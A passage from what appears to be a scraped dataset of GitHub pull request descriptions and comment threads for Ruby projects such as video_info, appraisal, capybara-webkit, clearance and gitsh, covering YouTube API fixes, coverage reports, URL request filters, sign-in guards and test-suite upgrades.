pulling **a9999b6a839183a5a4e2baf746113918ed455990 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2533756/badge)](https://coveralls.io/builds/2533756)\n\nCoverage decreased (-11.03%) to 88.97% when pulling **89b36d85e23f33bba42142adae5624e6a99518b4 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2533659/badge)](https://coveralls.io/builds/2533659)\n\nCoverage decreased (-11.03%) to 88.97% when pulling **89b36d85e23f33bba42142adae5624e6a99518b4 on vheuken:youtube-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', ""Any chance you can merge this soon? I want to start working on YoutubePlaylist but I'll need VideoInfo.provider_api_keys functionality from this PR.\r\n\r\nThanks!\r\n\r\nEDIT: Actually, it looks like this doesn't need to be merged for the YoutubePlaylist stuff."", ""@vheuken I'll merge everything before the end of the week. Thanks for your work!"", ""There is also a way to get this done without the need of having to you the YouTube Api and the need of an API key. Someone considered using YouTube's oembed provider? The only thing, you don't get back is the duration of the video. Maybe this is a nice alternative to use, when not having / wanting to use an api key?\r\n\r\nExample: http://www.youtube.com/oembed?format=json&url=https://www.youtube.com/playlist?list=PL3E758C25EA8E0B4A"", ""@Calamari You also don't get the video description, date, or view count. Granted, you could still give the option to include partial functionality with no provided API key. If @thibaudgg is interested in having this, I can implement it (assuming you don't want to) and just raise an error if an end user attempts to get data that requires an API key."", 'For me as a user this will be very useful feature.', ""It'd be useful for me too, since right now I only care about the Youtube title in my project."", ""I can also imagine several use cases, where this is useful without having to use the whole api stuff.\r\n\r\nI don't think I will have to time for that right now, to do it, but if you want, you can do it."", ""Everything we can get without the API key is a big plus, I say go for it. I'll merge this pull request but not release a new version until we add the `oembed` data fetching.\r\n@vheuken @Calamari @drakmail somebody could submit a new PR for that? Thanks a lot!"", 'I just thought about it, YouTube does not provide the description data via oembed, but it does present it in their OpenGraph data.\r\n\r\nIf someone is to be really smart, you could also get the duration via Micro Formats of the page\xe2\x80\xa6 (In fact you can get almost everything you can ask for through their Micro Formats.)']"
816,thibaudgg/video_info,73.0,"Turns out, the playlist being tested against has had a video added recently. This caused a spec to fail.

I added the new video to the spec and it works now.","['\n[![Coverage Status](https://coveralls.io/builds/2549380/badge)](https://coveralls.io/builds/2549380)\n\nCoverage remained the same at 100.0% when pulling **acd5e2e33ef06ee1d0c779d89ab066a255fd6487 on vheuken:youtubeplaylist-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2549380/badge)](https://coveralls.io/builds/2549380)\n\nCoverage decreased (-10.53%) to 89.47% when pulling **acd5e2e33ef06ee1d0c779d89ab066a255fd6487 on vheuken:youtubeplaylist-fix** into **fd031d447e7e747922f331f1e5fc61663bc037ab on thibaudgg:master**.\n', ""It's still failing for me (rebased on master) with with a lot of 404. Could you try to rebase this PR on master? Thanks!\r\n\r\n```\r\n  1) VideoInfo::Providers::YoutubePlaylist#available? with valid playlist #available? should be truthy\r\n     Failure/Error: it { is_expected.to be_truthy }\r\n       expected: truthy value\r\n            got: false\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:30:in `block (5 levels) in <top (required)>'\r\n\r\n  2) VideoInfo::Providers::YoutubePlaylist with playlist PL9hW1uS6HUftLdHI6RIsaf #title \r\n     Failure/Error: subject { super().title }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtube.rb:93:in `_video_snippet'\r\n     # ./lib/video_info/providers/youtube.rb:18:in `title'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:83:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:84:in `block (4 levels) in <top (required)>'\r\n\r\n  3) VideoInfo::Providers::YoutubePlaylist with playlist PL9hW1uS6HUftLdHI6RIsaf #description \r\n     Failure/Error: subject { super().description }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:32:in `_playlist_entry'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:22:in `description'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:88:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:89:in `block (4 levels) in <top (required)>'\r\n\r\n  4) VideoInfo::Providers::YoutubePlaylist with playlist PL9hW1uS6HUftLdHI6RIsaf #thumbnail_small \r\n     Failure/Error: subject { super().thumbnail_small }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtube.rb:93:in `_video_snippet'\r\n     # ./lib/video_info/providers/youtube.rb:47:in `thumbnail_small'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:118:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:119:in `block (4 levels) in <top (required)>'\r\n\r\n  5) VideoInfo::Providers::YoutubePlaylist with playlist PL9hW1uS6HUftLdHI6RIsaf #thumbnail_medium \r\n     Failure/Error: subject { super().thumbnail_medium }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtube.rb:93:in `_video_snippet'\r\n     # ./lib/video_info/providers/youtube.rb:51:in `thumbnail_medium'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:123:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:124:in `block (4 levels) in <top (required)>'\r\n\r\n  6) VideoInfo::Providers::YoutubePlaylist with playlist PL9hW1uS6HUftLdHI6RIsaf #thumbnail_large \r\n     Failure/Error: subject { super().thumbnail_large }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtube.rb:93:in `_video_snippet'\r\n     # ./lib/video_info/providers/youtube.rb:55:in `thumbnail_large'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:128:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:129:in `block (4 levels) in <top (required)>'\r\n\r\n  7) VideoInfo::Providers::YoutubePlaylist with playlist PL9hW1uS6HUftLdHI6RIsaf #videos \r\n     Failure/Error: subject { super().videos }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:32:in `_playlist_entry'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:48:in `_playlist_video_ids'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:12:in `videos'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:133:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:134:in `block (4 levels) in <top (required)>'\r\n\r\n  8) VideoInfo::Providers::YoutubePlaylist with playlist PL0E8117603D70E10A in embed path #videos \r\n     Failure/Error: subject { super().videos }\r\n     OpenURI::HTTPError:\r\n       404 Not Found\r\n     # ./lib/video_info/provider.rb:60:in `_set_data_from_api'\r\n     # ./lib/video_info/provider.rb:32:in `data'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:32:in `_playlist_entry'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:48:in `_playlist_video_ids'\r\n     # ./lib/video_info/providers/youtubeplaylist.rb:12:in `videos'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:152:in `block (4 levels) in <top (required)>'\r\n     # ./spec/lib/video_info/providers/youtube_playlist_spec.rb:153:in `block (4 levels) in <top (required)>'\r\n```"", 'Odd. I just tried it and it only fails when I rebase with master. ', ""Oh, I see the problem. It uses the V2 API still but it inherits _api_base and _api_url from Youtube, which uses the V3 API. Simply switching the _api_url and _api_base to the V2 version causes some other stuff to break.\r\n\r\nI suppose I need to just switch it to the V3 API. I'll do that either tonight or tomorrow."", '\n[![Coverage Status](https://coveralls.io/builds/2568572/badge)](https://coveralls.io/builds/2568572)\n\nCoverage remained the same at 89.05% when pulling **ab234f550623eaea1d5a68b93cf31c596f3b9449 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2568572/badge)](https://coveralls.io/builds/2568572)\n\nCoverage remained the same at 89.05% when pulling **ab234f550623eaea1d5a68b93cf31c596f3b9449 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '@vheuken awesome thanks!', '\n[![Coverage Status](https://coveralls.io/builds/2572460/badge)](https://coveralls.io/builds/2572460)\n\nCoverage increased (+10.71%) to 99.76% when pulling **08a7bd1c4c652aae3b0c739690268f0c27e8bdb4 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2572460/badge)](https://coveralls.io/builds/2572460)\n\nCoverage increased (+0.02%) to 89.07% when pulling **08a7bd1c4c652aae3b0c739690268f0c27e8bdb4 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2572460/badge)](https://coveralls.io/builds/2572460)\n\nCoverage increased (+0.02%) to 89.07% when pulling **08a7bd1c4c652aae3b0c739690268f0c27e8bdb4 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2572609/badge)](https://coveralls.io/builds/2572609)\n\nCoverage increased (+0.02%) to 89.07% when pulling **1a9f5b3ccfb75c16cf1472f1237e4612aa2fc686 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2572609/badge)](https://coveralls.io/builds/2572609)\n\nCoverage increased (+0.02%) to 89.07% when pulling **1a9f5b3ccfb75c16cf1472f1237e4612aa2fc686 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', ""I'm down to only three specs failing. Getting there..."", '\n[![Coverage Status](https://coveralls.io/builds/2572887/badge)](https://coveralls.io/builds/2572887)\n\nCoverage increased (+10.95%) to 100.0% when pulling **28c1100712edc83c253622cbedb5fca2505f8eab on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2572887/badge)](https://coveralls.io/builds/2572887)\n\nCoverage increased (+10.95%) to 100.0% when pulling **28c1100712edc83c253622cbedb5fca2505f8eab on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2577863/badge)](https://coveralls.io/builds/2577863)\n\nCoverage increased (+0.33%) to 89.38% when pulling **2ad1a71adb6e0384e88524d1013156c529d61e02 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', ':+1:', 'Down to two (also an ugly hack that\'ll be removed). I\'ll hopefully get to\nthem today.\nOn May 16, 2015 11:43 AM, ""Thibaud Guillaume-Gentil"" <\nnotifications@github.com> wrote:\n\n> [image: :+1:]\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/thibaudgg/video_info/pull/73#issuecomment-102665057>.\n>\n', '\n[![Coverage Status](https://coveralls.io/builds/2582134/badge)](https://coveralls.io/builds/2582134)\n\nCoverage increased (+0.16%) to 89.21% when pulling **a045490cc9009a9e922cbab48456d002b3f4530b on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2582155/badge)](https://coveralls.io/builds/2582155)\n\nCoverage increased (+10.95%) to 100.0% when pulling **a045490cc9009a9e922cbab48456d002b3f4530b on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2582155/badge)](https://coveralls.io/builds/2582155)\n\nCoverage increased (+0.16%) to 89.21% when pulling **a045490cc9009a9e922cbab48456d002b3f4530b on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', 'Hm....this is odd. The API seems to only be returning 5 videos on a playlist that has 6. Wonder what the issue is.\r\n\r\nOnly one remaining failing spec, though!', '\n[![Coverage Status](https://coveralls.io/builds/2582283/badge)](https://coveralls.io/builds/2582283)\n\nCoverage increased (+0.27%) to 89.32% when pulling **d9100b43197f3e64d3393086bedae8502ea376f3 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', ""Whelp, looks like there is a bug in the Youtube PlaylistsItems API where some videos just don't show up. That's annoying. \r\n\r\nOther people who hit the bug:\r\nhttp://stackoverflow.com/questions/22605693/youtube-api-v3-missing-items-in-playlist-when-requesting-them-with-playlistite\r\nhttp://stackoverflow.com/questions/22499170/retrieve-youtube-playlist-wrong-when-playlist-items-count-over-100/22499606?noredirect=1#comment34231492_22499606"", '\n[![Coverage Status](https://coveralls.io/builds/2582298/badge)](https://coveralls.io/builds/2582298)\n\nCoverage increased (+0.27%) to 89.32% when pulling **de23edbcb24d5d8050d4bfc3126408df538f4119 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2582307/badge)](https://coveralls.io/builds/2582307)\n\nCoverage increased (+0.27%) to 89.32% when pulling **de23edbcb24d5d8050d4bfc3126408df538f4119 on vheuken:youtubeplaylist-fix** into **9566b9c517fee19687f93dc2189d478ba403a6e1 on thibaudgg:master**.\n', '@vheuken do you think micro format would help for Youtube Playlists as well?', 'There is, but only for playlist description, title, and keywords.', '@vheuken ok, then it would be nice to support them. What do you think?']"
817,thibaudgg/video_info,79.0,"This is pretty much done, except for a few things:
* ~~THE INEVITABLE FLOOD OF HOUNDCI VIOLATIONS WOOO~~ Fewer than I expected
* ~~I should clean it up a bit. `#date`, `#description`, and a few other functions can have the bulk moved to a single helper function.~~ 
* ~~I apparently broke some YoutubePlaylist stuff in the process~~ ~~Most is fixed. Just need to get `#keywords` working on the API.~~ Done
* ~~Update documentation since an API key isn't required for most things anymore~~
  * ~~Note that the scraper only includes the date posted. API is required to get exact time.~~ DONE
* ~~I have a question about the spec. For `#keywords`, I'm getting this failed spec:~~

```ruby
  1) VideoInfo::Providers::Youtube with video mZqGqE0D0n4 #keywords should be nil
     Failure/Error: it { is_expected.to be_nil }
       expected: nil
            got: ""cherry, bloom, king, of, the, knife, guitar, drum, clip, rock, alternative, tremplin, Paris-Forum""
     # ./spec/lib/video_info/providers/youtube_spec.rb:167:in `block (4 levels) in <top (required)>'
```

~~I assume the spec is wrong, but it passes with the API. The API code is probably doing something wrong. I'll have a better look in a day or two when I finish this. Opened this so I could document what I have to do next~~ Fixed the spec. ","['\n[![Coverage Status](https://coveralls.io/builds/2708052/badge)](https://coveralls.io/builds/2708052)\n\nCoverage decreased (-8.45%) to 91.34% when pulling **f1477ad83c8728a1fdb8c585c89229ea5efdd9d7 on vheuken:youtube-scraper** into **002bcc4161c6d296c1fe59b201de00fb9071b4ed on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2708082/badge)](https://coveralls.io/builds/2708082)\n\nCoverage decreased (-8.45%) to 91.34% when pulling **177c86440e931acfb6f0b0359da9b4ae51c4c104 on vheuken:youtube-scraper** into **002bcc4161c6d296c1fe59b201de00fb9071b4ed on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2708153/badge)](https://coveralls.io/builds/2708153)\n\nCoverage decreased (-8.45%) to 91.34% when pulling **177c86440e931acfb6f0b0359da9b4ae51c4c104 on vheuken:youtube-scraper** into **002bcc4161c6d296c1fe59b201de00fb9071b4ed on thibaudgg:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2708153/badge)](https://coveralls.io/builds/2708153)\n\nCoverage decreased (-8.45%) to 91.34% when pulling **177c86440e931acfb6f0b0359da9b4ae51c4c104 on vheuken:youtube-scraper** into **002bcc4161c6d296c1fe59b201de00fb9071b4ed on thibaudgg:master**.\n', ""I should also replace open-uri with Net::HTTP. I'm getting an open-uri error when I integrate it into my project and I'm not sure I feel comfortable with open_uri_redirections gem now that I think about it."", 'Going back to Net::HTTP seems like a good idea! :+1: ', ""Wow, it looks like you can only get tags/keywords through the API if you authenticate as the user who owns the video. I guess I'll have it so that the API will scrape for this info."", ':+1:', 'Keywords stuff is done. Just gotta fix the stuff that broke in YoutubePlaylist.', ""I'm down to three failing specs. Unfortunately it's late and I'm going to have to save the final three specs + cleanup for tomorrow.\r\n\r\nGetting close, though."", '@vheuken :+1: have a good night, thanks!\r\n', 'Now down to one (plus a Vkontakte one that is unrelated). \r\n\r\nAccording to the API documentation, we should be getting the tags/keywords for the YoutubePlaylist with our API request.....but we\'re not. It\'s not giving us an empty list, it\'s just not returning giving a ""tags"" property at all. They definately exist though, since I am getting them through the scraper. Odd.\r\n\r\nAfter that, just cleanup.', '@vheuken do you expect to have this ready in the next few days?', ""@robguilfoyle Yes. I'm going to be working on it more tonight."", 'I removed all of the duplicate code in YoutubeScraper. Now all that is left is that one failing spec and whatever houndci violations I made.', ""@vheuken I'll be out in Vacation for two weeks starting tomorrow, so I'll most likely merge and deploy a new version when I'm back."", ""@thibaudgg No problem. I'll _definitely_ be finished by then."", '@vheuken done?', ""Unfortunately I still haven't had time. Still just one thing failing. I'll handle it either tonight or sometime tomorrow. Sorry for the delay."", '@vheuken no problem, take your time!\r\n\r\nPS: Once we merged that PR, what would you think about joining me as a maintainer of VideoInfo?', ""It looks like there is no way to check through the API if a video is no longer available on Youtube due to a copyright claim. It just treats it like a normal video and gets the info.\r\n\r\nI'm not totally sure what the best way to proceed is. One option is to just allow `available?` to return true when going through the API, since it _does_ get all the necessary info. Another option is to just use the scraper. What do you think?\r\n\r\n>PS: Once we merged that PR, what would you think about joining me as a maintainer of VideoInfo?\r\n\r\nSure, I'd be happy to do that. "", ""I'm fine with always returning true when using `available?` though the API. :+1:"", ""Right now all the Youtube bugs are fixed. There's still a bug in YoutubePlaylist API where it doesn't get keywords. I'll have to see if that is a regression or if it never worked."", 'Awesome, looking forward to merge this PR!', ""This is odd. I checked, and back before I did the stuff for the API, the spec said `#keywords` was expected to be nil. When I implemented the YoutubePlaylist scraper, I saw that there was a section for keywords in the HTML and added that to the spec. The v3 API doesn't seem to give keywords for playlists.\r\n\r\nSo....couple options here:\r\nA) Go back to how 2.4.1 worked and just have `#keywords` in YoutubePlaylist return nil\r\nB) Let YoutubePlaylist continue returning the keywords it finds in the HTML, and have the API return nil\r\nC) Have the API continue to try to find the keywords and just stub out the spec \r\n\r\n"", ""I'm leaning towards option A. It prevents breakage if someone switches from the scraper to the API and is consistent with earlier versions of the video_info.\r\n"", ""Let's go with A. and maybe open a issue about it so we can fix it later. :+1:"", 'Now the only spec failing is `Vkontakte#available?`, which is unrelated.', ""Oh wait, jruby is failing like crazy, but that's all Vkontakte stuff. I can give that a look soon.\r\n\r\nOther than that, looks ready to merge!"", ':+1: Thanks a lot!']"
818,thoughtbot/appraisal,64.0,"This CLI is now a new way to use Appraisal to run your test suite

Before this change, Appraisal can only be invoked by `rake appraisal`, which has a bad side effect when you're trying to set it as a default rake task. Also, you cannot run a single test file without setting the environment variable yourself.

After this, you can pretty much run any command within a correct dependency context. For example, to run the whole test suite:

```
appraisal rake
```

To run a single unit test against `rails-3-1` appraisal:

```
appraisal rails-3-1 ruby -Itest test/foo_test.rb
```

Also, all the rake task has been changed into more sensible subcommands. From this help page:

```
$ appraisal help
Appraisal: Find out what your Ruby gems are worth.

Usage:
  appraisal [APPRAISAL_NAME] EXTERNAL_COMMAND

  If APPRAISAL_NAME is given, only run that EXTERNAL_COMMAND against the given
  appraisal, otherwise it runs the EXTERNAL_COMMAND against all appraisals.

Available Appraisal(s):
  rails-3-0
  rails-3-1

Commands:
  appraisal clean                  # Remove all generated gemfiles and lockfiles from gemfiles folder
  appraisal generate               # Generate a gemfile for each appraisal
  appraisal help [COMMAND]         # Describe available commands or one specific command
  appraisal install                # Resolve and install dependencies for each appraisal
  appraisal update [LIST_OF_GEMS]  # Remove all generated gemfiles and lockfiles, resolve, and install dependencies again
```","['Lovely.\r\n\r\nI hope `--help` also works.', '@mike-burns [actually, it does](https://gist.github.com/sikachu/5dbcf86464e801bb61db)! Thanks to Thor.', ""Well that's awesome. I don't suppose it's possible to get a man page for this, eh?"", ""@mike-burns I think it's possible, but I haven't looked into specific yet. Since if you do `bundle help` it actually opens up a man page, and Bundler has this: https://github.com/bundler/bundler/tree/master/man"", '@mcmire solid comments. Thank you! :+1: ']"
819,thoughtbot/capybara-webkit,686.0,"Adds a new request filter with three modes:

* Warn on an outgoing remote request (default)
* Stub out remote requests with an empty response
* Allow remote requests without a warning
* Allow adding custom localhost definitions","['Should we deprecate the blacklist in favor of the whitelist? I think the two features are redundant, and may lead to confusion when used in combination.\r\n\r\nI think the concept of ""allowed hosts"" is clearer than ""localhosts"", since users may want to whitelist external services that may not be ""local"".\r\n\r\nOtherwise, this looks great!', 'I think the blacklist feature is more useful for users who are using capybara/capybara-webkit for screen scraping and other uses besides automated tests. I\'m not as concerned about that, but I know we\'d be causing some users trouble if we dropped the blacklist.\r\n\r\nAgreed on the change for ""allowed host"" vs ""localhost"" - that seems pretty straightforward.\r\n\r\nAny thoughts on whether we should switch this to a full wildcard whitelist instead? That complicates things more, and means the interaction between the whitelist and the blacklist seems less obvious, but it potentially serves a wider audience.', 'On further thought I think a simple host match as is sufficient for now.', 'I updated this now that the request filters were refactored to use Chain of Responsibility.\r\n\r\n@mhoran one to give this one last look before I merge?', ""@mhoran this is updated again. I revamped things a little bit, and I think it's now pretty cohesive:\r\n\r\n* The driver now has `allow_url`, `block_url`, and `block_unknown_urls`.\r\n* Both `allow_url` and `block_url` accept wildcards.\r\n* Any requests to blocked URLs will be blocked immediately, regardless of allowed URLs.\r\n* By default, any requests to localhost and 127.0.0.1 are allowed.\r\n* By default, any requests to unknown hosts will print a warning.\r\n* Invoking `block_unknown_urls` will cause unknown hosts to be silently blocked.\r\n* The existing `blacklisted_urls=` method is deprecated in favor of `block_url`.\r\n\r\nI think this handles our use cases well:\r\n\r\n* Most users will get warnings if they're unexpectedly making remote requests.\r\n* Users can easily block remote requests if they prefer.\r\n* Users can add aliases for local host (or remote hosts they really want to allow).\r\n* Users can block specific paths, even on local host (for things like puffing billy or whatever).\r\n* This should be fully backwards-compatible, but will print warnings for some users.\r\n\r\nThoughts?"", 'This looks great! Thanks for putting up with all my feedback.', ""Thanks for all your help! I think it turned out much better than it started.\r\n\r\nI squashed and force pushed, but I'm going to wait until CI passes before merging to master."", ""I just went to add this to a project and noticed the API is a bit clunky. I assume this will typically be configured in a `before :each` block, as the driver type is not known in `before :all`. In that case, I may configure the whitelist in my `spec_helper.rb`, via `config.before :each`. However, `page.driver.allow_url` will then be called for each JS feature test, resulting in duplicate whitelist entries.\r\n\r\nPerhaps the whitelist should be reset, and unknown URL mode reset, when the driver is reset. In that case, I don't think we need to expose a mechanism to switch back to warn mode, as a simple reset would do so. I definitely prefer the additive nature of `allow_url` and `block_url` to the previous setter for the blacklist, though the setter did not have the problem of duplicate entries when configured via `before :each`."", ""Yeah, that's good feedback. I opened #692 to have them reset between specs.""]"
820,thoughtbot/clearance,370.0,"Sign in guards provide you with fine-grained control over the process of
signing in a user. Each guard is run in order and will hand the session
off to the next guard in the process. Any guard may also choose to fail
the sign in process and provide a message explaining why. Additionally
you could immediately determine the sign in process was a success and
skip running additional guards.","[""I have a few comments - but I'm not sold on this PR in general. Why would I use it? Is it for *n*-step login wizards? Or is it for replacing `user.confirmed? && user.cool? && user.not_a_haxxor?` in `SessionsController` with three single-purpose classes, one per condition?"", ""It is not for the n-step login wizards (but it could maybe be used here?). The point of this is to allow developers and gems to not have to override the SessionsController and have better control over what happens to the session. The examples we've discussed are handling email confirmation, disabled accounts, or throttling sign in attempts. I'm sure there are plenty of other use cases."", 'Before merging, I think it\'s worth considering alternate names for ""steps."" Steps calls multi-step sign-in to mind, which I think is what confused Gabe. What about ""filters"" or ""guards?""', 'Ship it (squirrels etc pip pip)', '`Guards` is a much less confusing name, and so is `stack`.']"
821,thoughtbot/clearance,410.0,"If the return_to url has a query string attached to it, we want to be sure we
are including it when clearance redirects.

URI::HTTP has the wonderful `request_uri` method that returns us the path and
query string together, but our session variable stores only
`fullpath` which URI parses as URI::Generic. That means we have to assemble
the path and query string ourselves.","['Looks right.', ':+1: ']"
822,thoughtbot/clearance,468.0,"* Upgrade to rspec 2.99
* Change to expect syntax
* Change one-liners to `is_expected` syntax
* Fix hound warnings on long lines
* Fix ruby warnings re: `match` rspec matcher (add parens around regex)",['merged. Thanks @scriptmonkey ']
823,thoughtbot/clearance,488.0,"Running `rails generate clearance:specs` in an `rspec-rails` 3 project
resulted in broken tests due to the different `spec_helper` files
generated between versions 2 and 3.

In RSpec 3, feature specs should require `rails_helper` rather than
`spec_helper`. Additionally, neither default helper recursively requires
files in `spec/support` as `spec_helper` did under RSpec 2.

To remedy these problems, several changes were made:

1. The specs are now generated from template files which require the
correct helper based on your rspec-rails version.

2. Instead of configuring RSpec globally so we can use FactoryGirl
syntax methods we now explicitly call `FactoryGirl.create` where needed.

3. Instead of relying on Clearance feature spec helpers to be mixed in
to all features we now only do this when the Clearance feature helpers
are explicitly required.

4. Instead of a global `before` to empty ActionMailer deliveries, we now
do this explicitly in the specs that require it.

We're trying to make fewer assumptions about how a user sets up their
test suite, how they use Factory Girl, etc. The result is that if you
use RSpec and Factory Girl, generated specs should just work and should
not screw up any other tests.",['That was fast. LGTM']
824,thoughtbot/clearance,490.0,"Another step in modernizing the clearance test suite. We've been using
rspec-mocks on our projects for over a year now.","['One question on whether we should use class doubles instead - otherwise, LGTM!']"
825,thoughtbot/clearance,274.0,"Ruby 2.0 requires Rails 3.2.13, currently in rc. Update appraisals to
run only that version of rails under 2.0. Update travis build matrix to
do the same.

Seems a PR is the only way to get travis to try my build matrix changes, so hopefully I got those right.","['Looks good to me. Will be interesting to see what Travis says.', 'Merged. Thanks, @derekprior.']"
826,thoughtbot/clearance,564.0,"Instead of having two separate `before_filter`s that both render the same
failure notice, we'll just define a single callback method that checks on both
conditions. This clarifies what conditions warrant this particular failure
message.","[""This one takes me back! I think I introduced those filters in Feb 2009: https://github.com/thoughtbot/clearance/commit/80a270b129a3c7b4e6948393c8e957b2af39b588\r\n\r\nOnly benefit I can think of to have the separate methods is if someone wanted to override the private methods to do something different. It's possible some apps are doing that. Not technically part of the public API https://github.com/thoughtbot/clearance#controllers so should be okay if it breaks.\r\n\r\nLooks good to me but @derekprior's more up to date."", ""@croaky Yeah, I definitely considered the fact that it'd break for anyone who was overriding those private methods. However, the fact that they're not part of the public API (as you said) and we're considering this as part of the 2.0 release, I think breakage/non-backwards-compatibility is acceptable."", ""Good consolidation. Breaking changes are a fine line to walk when it comes to an engine. Almost everything could be considered a breaking change.\r\n\r\nI cant think of a use case where you'd want to handle both of these seperately. I think I'm okay with the consolidation here and okay with doing it in 1.11."", ""Thanks for the feedback, @drapergeek @croaky and @derekprior. I've pushed up some changes - ready for re-review."", ':+1:  ', 'I like it. :+1:']"
827,thoughtbot/gitsh,77.0,Don't add blank lines to the history #50,"[""This is a good start: It should prevent blank lines being saved to the history file. There is one more case to consider, though. The current session's history isn't written to the file until the end of the session, so there will still be blank lines in the history during the current session."", 'The code style changes look great, I have no more complaints there.\r\n\r\nThis will no longer write or read blank lines to or from the history file, but blank lines are still possible in the current session because the [`Readline.readline`](http://ruby-doc.org/stdlib-2.1.0/libdoc/readline/rdoc/Readline.html#method-c-readline) method is adding lines to `Readline::HISTORY` as the user enters them.', 'Hi George \r\nAm trying to understand why Readline.readline should not add blank lines to the current session. The read command method in cli.rb uses this to read a command and execute blank lines as git status. So if I remove blank lines from the current session am guessing the status will never be returned or am I missing a piece of the puzzle?\r\nCan I remove a blank line from the current session after it has been executed?', 'Hi George \r\nWhere is the current session handled, is it in the environment class or the cli.rb. ', ""`Readline` stores the history of the current session in `Readline::HISTORY`. The `Gitsh::History` object (which you've already worked on) populates `Readline::HISTORY` when gitsh starts with the history from earlier sessions, and then each time we call `Readline.readline(prompt, true)` the new input is added to `Readline::HISTORY`."", '@georgebrock Adam and I paired on this issue this afternoon. Cheers on injecting `Readline`, that made 